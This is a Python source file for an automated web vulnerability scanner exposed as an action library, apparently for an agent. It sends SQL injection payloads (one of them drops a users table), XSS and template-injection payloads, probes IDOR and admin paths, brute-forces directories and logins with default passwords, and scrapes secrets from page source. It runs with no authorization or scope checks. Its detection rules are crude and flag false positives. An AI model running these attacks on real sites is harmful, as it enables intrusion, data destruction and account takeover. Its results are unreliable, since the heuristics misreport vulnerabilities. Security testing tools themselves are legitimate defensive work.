import logging
import requests
import urllib.parse
import re
import time
from bs4 import BeautifulSoup
from typing import List, Dict, Set, Optional

logger = logging.getLogger(__name__)

class ActionLibrary:
    def __init__(self):
        self.actions = {
            "crawl_and_scan": self._crawl_and_scan,
            "test_sql_injection": self._test_sql_injection,
            "test_xss": self._test_xss,
            "test_ssti": self._test_ssti,
            "test_idor": self._test_idor,
            "test_privilege_escalation": self._test_privilege_escalation,
            "directory_bruteforce": self._directory_bruteforce,
            "check_headers": self._check_headers,
            "test_credential_bruteforce": self._test_credential_bruteforce,
            "analyze_source_for_secrets": self._analyze_source_for_secrets,
            "log_vulnerability": self._log_vulnerability,
        }
        self.context = {}
        self.visited = set()
        self.findings = []

    def list_actions(self):
        return list(self.actions.keys())

    def execute(self, action_name: str, **kwargs):
        if action_name not in self.actions:
            raise ValueError(f"Unknown action: {action_name}")
        return self.actions[action_name](**kwargs)

    # ----- Main crawl-and-scan -----
    def _crawl_and_scan(self, base_url: str, max_depth: int = 3, max_pages: int = 50) -> str:
        self.visited = set()
        self.findings = []
        print(f"\n🕷️ Starting deep crawl and scan on {base_url} ...")
        self._crawl(base_url, depth=0, max_depth=max_depth, max_pages=max_pages)
        report = f"## 🛡️ Crawl & Scan Report\n\n"
        if self.findings:
            report += "### Vulnerabilities Found:\n"
            for f in self.findings:
                report += f"- {f}\n"
        else:
            report += "No vulnerabilities found.\n"
        report += f"\n📊 Total pages crawled: {len(self.visited)}\n"
        report += f"🔍 Total findings: {len(self.findings)}\n"
        return report

    # ----- Recursive crawler -----
    def _crawl(self, url: str, depth: int, max_depth: int, max_pages: int):
        if depth > max_depth or len(self.visited) >= max_pages or url in self.visited:
            return
        self.visited.add(url)
        print(f"  🌐 Crawling: {url} (depth {depth})")
        try:
            resp = requests.get(url, timeout=10, allow_redirects=True)
            content_type = resp.headers.get('Content-Type', '')
        except Exception as e:
            print(f"    ⚠️ Failed to fetch {url}: {e}")
            return

        # Analyze source for secrets
        secrets = self._analyze_source_for_secrets(url, resp.text)
        if secrets:
            self.findings.append(f"[{url}] {secrets}")

        # Test this page
        self._test_page(url, resp, method="GET")

        # If HTML, extract links
        if 'html' in content_type:
            soup = BeautifulSoup(resp.text, 'lxml')
            # Extract links from <a>, <link>, <script>, <form>
            for tag in soup.find_all(['a', 'link', 'script', 'form']):
                if tag.name == 'a' and tag.get('href'):
                    link = tag['href']
                elif tag.name in ['link', 'script'] and tag.get('src'):
                    link = tag['src']
                elif tag.name == 'form' and tag.get('action'):
                    link = tag['action']
                else:
                    continue
                full_url = urllib.parse.urljoin(url, link)
                if full_url.startswith(('http://', 'https://')):
                    if urllib.parse.urlparse(full_url).netloc == urllib.parse.urlparse(base_url).netloc:
                        if full_url not in self.visited:
                            self._crawl(full_url, depth+1, max_depth, max_pages)

            # Also test forms with POST
            for form in soup.find_all('form'):
                action = form.get('action')
                if action:
                    form_url = urllib.parse.urljoin(url, action)
                    if form_url.startswith(('http://', 'https://')):
                        self._test_page(form_url, resp, method="POST", form=form)

        # Quick directory fuzzing on the parent path
        dirs = ["/admin", "/backup", "/config", "/test", "/api", "/dev", "/temp"]
        for d in dirs:
            test_url = urllib.parse.urljoin(url, d)
            if test_url not in self.visited:
                try:
                    r = requests.get(test_url, timeout=5)
                    if r.status_code == 200 and "login" not in r.text.lower():
                        self.findings.append(f"[{test_url}] Discovered accessible directory (status 200)")
                    elif r.status_code == 403:
                        self.findings.append(f"[{test_url}] Directory protected (403)")
                except:
                    pass

    # ----- Test a page for all vulnerabilities -----
    def _test_page(self, url: str, response: requests.Response = None, method: str = "GET", form=None):
        if not response:
            try:
                response = requests.get(url, timeout=10)
            except:
                return

        # Check parameters in query string
        if '?' in url:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            for param in params.keys():
                sql_result = self._test_sql_injection(url, param, method="GET")
                if "SQL Injection detected" in sql_result:
                    self.findings.append(f"[{url}] {sql_result}")
                xss_result = self._test_xss(url, param, method="GET")
                if "XSS vulnerability detected" in xss_result:
                    self.findings.append(f"[{url}] {xss_result}")
                ssti_result = self._test_ssti(url, param, method="GET")
                if "SSTI vulnerability detected" in ssti_result:
                    self.findings.append(f"[{url}] {ssti_result}")

        # If form, test its fields
        if form:
            form_method = form.get('method', 'GET').upper()
            action = form.get('action')
            full_action = urllib.parse.urljoin(url, action)
            inputs = form.find_all('input')
            data = {}
            for inp in inputs:
                name = inp.get('name')
                if name:
                    data[name] = "test"
            for field in data.keys():
                sql_result = self._test_sql_injection(full_action, field, method="POST")
                if "SQL Injection detected" in sql_result:
                    self.findings.append(f"[{full_action}] {sql_result}")
                xss_result = self._test_xss(full_action, field, method="POST")
                if "XSS vulnerability detected" in xss_result:
                    self.findings.append(f"[{full_action}] {xss_result}")
                ssti_result = self._test_ssti(full_action, field, method="POST")
                if "SSTI vulnerability detected" in ssti_result:
                    self.findings.append(f"[{full_action}] {ssti_result}")

        # IDOR: try numeric params
        if '?' in url:
            for param, values in urllib.parse.parse_qs(urllib.parse.urlparse(url).query).items():
                if values and values[0].isdigit():
                    base = url.replace(f"{param}={values[0]}", "")
                    for i in range(1, 6):
                        test_url = f"{base}{param}={i}"
                        try:
                            r = requests.get(test_url, timeout=5)
                            if r.status_code == 200 and "login" not in r.text.lower() and len(r.text) > 100:
                                self.findings.append(f"[{test_url}] IDOR possible: accessed ID {i}")
                        except:
                            pass

        # Check headers
        headers_result = self._check_headers(url)
        if "Missing security headers" in headers_result:
            self.findings.append(f"[{url}] {headers_result}")

        # Check admin access
        if "admin" in url or "dashboard" in url:
            priv_result = self._test_privilege_escalation(url)
            if "accessible admin" in priv_result:
                self.findings.append(f"[{url}] {priv_result}")

    # ----- Existing test methods (unchanged) -----
    def _test_sql_injection(self, url: str, parameter_to_test: str, method: str = "GET") -> str:
        payloads = ["' OR '1'='1", "' UNION SELECT NULL--", "'; DROP TABLE users--", "' AND 1=1--", "' AND 1=2--", "' OR 'x'='x", "1' AND 1=1--", "1' AND 1=2--", "admin'--", "') OR ('1'='1"]
        findings = []
        for payload in payloads:
            test_params = {parameter_to_test: payload}
            try:
                if method.upper() == "GET":
                    resp = requests.get(url, params=test_params, timeout=5)
                else:
                    resp = requests.post(url, data=test_params, timeout=5)
                content = resp.text.lower()
                if any(kw in content for kw in ["sql", "syntax", "mysql", "oracle", "postgresql", "microsoft ole db", "error in your sql"]):
                    findings.append(f"Payload: {payload} (status {resp.status_code})")
                if resp.status_code == 200 and "error" not in content:
                    findings.append(f"Potential blind SQLi with payload: {payload} (status {resp.status_code})")
            except:
                pass
        if findings:
            return f"SQL Injection detected on {parameter_to_test}:\n- " + "\n- ".join(findings)
        else:
            return f"No obvious SQL injection found on {parameter_to_test}."

    def _test_xss(self, url: str, parameter_to_test: str, method: str = "GET") -> str:
        payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "javascript:alert(1)", "';alert(1);//", "\"><script>alert(1)</script>"]
        findings = []
        for payload in payloads:
            test_params = {parameter_to_test: payload}
            try:
                if method.upper() == "GET":
                    resp = requests.get(url, params=test_params, timeout=5)
                else:
                    resp = requests.post(url, data=test_params, timeout=5)
                if payload in resp.text:
                    findings.append(f"Reflected XSS with payload: {payload} (status {resp.status_code})")
            except:
                pass
        if findings:
            return f"XSS vulnerability detected on {parameter_to_test}:\n- " + "\n- ".join(findings)
        else:
            return f"No obvious XSS found on {parameter_to_test}."

    def _test_ssti(self, url: str, parameter_to_test: str, method: str = "GET") -> str:
        payloads = ["{{7*7}}", "${7*7}", "{{7*'7'}}", "<%= 7*7 %>", "{{config}}", "{{self.__class__.__mro__}}"]
        findings = []
        for payload in payloads:
            test_params = {parameter_to_test: payload}
            try:
                if method.upper() == "GET":
                    resp = requests.get(url, params=test_params, timeout=5)
                else:
                    resp = requests.post(url, data=test_params, timeout=5)
                if "49" in resp.text or "7777777" in resp.text or "config" in resp.text:
                    findings.append(f"SSTI with payload: {payload} (status {resp.status_code})")
            except:
                pass
        if findings:
            return f"SSTI vulnerability detected on {parameter_to_test}:\n- " + "\n- ".join(findings)
        else:
            return f"No obvious SSTI found on {parameter_to_test}."

    def _test_idor(self, base_url: str, resource_path: str, id_param: str, target_id: int = 1) -> str:
        findings = []
        for i in range(target_id, target_id+5):
            test_url = f"{base_url}/{resource_path}?{id_param}={i}"
            try:
                resp = requests.get(test_url, timeout=5)
                if resp.status_code == 200 and len(resp.text) > 100 and "login" not in resp.text.lower():
                    findings.append(f"IDOR possible: accessed {test_url} with ID {i} (status 200)")
            except:
                pass
        if findings:
            return "IDOR vulnerability detected:\n- " + "\n- ".join(findings)
        else:
            return "No IDOR found."

    def _test_privilege_escalation(self, base_url: str) -> str:
        admin_paths = ["/admin", "/dashboard", "/panel", "/console", "/root", "/manage", "/administrator"]
        findings = []
        for path in admin_paths:
            test_url = base_url.rstrip("/") + path
            try:
                resp = requests.get(test_url, timeout=5)
                if resp.status_code == 200 and "login" not in resp.text.lower():
                    findings.append(f"Privilege escalation: accessible admin page at {test_url}")
            except:
                pass
        if findings:
            return "Privilege escalation opportunities found:\n- " + "\n- ".join(findings)
        else:
            return "No accessible admin pages found."

    def _directory_bruteforce(self, base_url: str) -> str:
        wordlist = ["admin", "login", "test", "backup", "secret", "config", "api", "dev", "temp", "private"]
        findings = []
        for dir_name in wordlist:
            test_url = base_url.rstrip("/") + "/" + dir_name
            try:
                resp = requests.get(test_url, timeout=5)
                if resp.status_code == 200:
                    findings.append(f"Directory found: {test_url}")
                elif resp.status_code == 403:
                    findings.append(f"Directory protected: {test_url} (403)")
            except:
                pass
        if findings:
            return "Directories discovered:\n- " + "\n- ".join(findings)
        else:
            return "No directories found."

    def _check_headers(self, url: str) -> str:
        try:
            resp = requests.get(url, timeout=5)
            headers = resp.headers
            missing = []
            for h in ["X-Frame-Options", "X-XSS-Protection", "Content-Security-Policy", "Strict-Transport-Security"]:
                if h not in headers:
                    missing.append(h)
            if missing:
                return f"Missing security headers: {', '.join(missing)}"
            else:
                return "All recommended security headers are present."
        except Exception as e:
            return f"Could not fetch headers: {e}"

    def _test_credential_bruteforce(self, login_url: str, username_field: str, password_field: str) -> str:
        users = ["admin", "root", "guest", "user", "test"]
        passes = ["password", "123456", "admin", "letmein", "qwerty", "password123"]
        findings = []
        for user in users:
            for pwd in passes:
                data = {username_field: user, password_field: pwd}
                try:
                    resp = requests.post(login_url, data=data, timeout=5)
                    if resp.status_code == 200 and "login" not in resp.text.lower() and "error" not in resp.text.lower():
                        findings.append(f"Credentials found: {user}:{pwd} (status {resp.status_code})")
                except:
                    pass
        if findings:
            return "Valid credentials found:\n- " + "\n- ".join(findings)
        else:
            return "No credentials found with basic wordlist."

    # ----- New: Analyze source for secrets -----
    def _analyze_source_for_secrets(self, url: str, source: str) -> str:
        patterns = [
            (r'(?i)api[_-]?key\s*[:=]\s*["\']([^"\']+)["\']', 'API Key'),
            (r'(?i)secret\s*[:=]\s*["\']([^"\']+)["\']', 'Secret'),
            (r'(?i)password\s*[:=]\s*["\']([^"\']+)["\']', 'Password'),
            (r'(?i)token\s*[:=]\s*["\']([^"\']+)["\']', 'Token'),
            (r'(?i)private\s*[:=]\s*["\']([^"\']+)["\']', 'Private Key'),
            (r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', 'IP Address'),
            (r'https?://[^\s"\']+', 'URL'),
        ]
        findings = []
        for pattern, name in patterns:
            matches = re.findall(pattern, source)
            if matches:
                findings.append(f"{name}: {matches[0][:50]}")
        if findings:
            return "Potential secrets found: " + ", ".join(findings)
        else:
            return "No obvious secrets found."

    def _log_vulnerability(self, url: str, parameter_to_test: str, type: str, evidence: str) -> str:
        print(f"🔴 [VULNERABILITY] {type} on {url} with parameter {parameter_to_test}")
        print(f"   Evidence: {evidence}")
        return f"Logged: {type} at {url} on {parameter_to_test} - {evidence}"
